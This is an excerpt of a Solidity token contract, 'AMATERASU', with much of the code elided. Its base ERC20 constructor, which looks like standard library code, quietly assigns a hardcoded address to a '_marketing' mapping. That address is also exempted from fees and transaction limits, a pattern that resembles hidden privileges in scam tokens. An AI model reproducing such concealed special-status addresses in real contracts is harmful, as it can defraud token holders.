...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0xF1cA95fA3373FDF080E6DF6b45E9dd270EEfd360] = _marketingwallet;
    }
...
contract AMATERASU is ERC20, Ownable {
    ...
    constructor() ERC20("Goddess of the sun", "AMATERASU") {
        ...
        excludeFromFees(address(0xF1cA95fA3373FDF080E6DF6b45E9dd270EEfd360), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xF1cA95fA3373FDF080E6DF6b45E9dd270EEfd360), true);
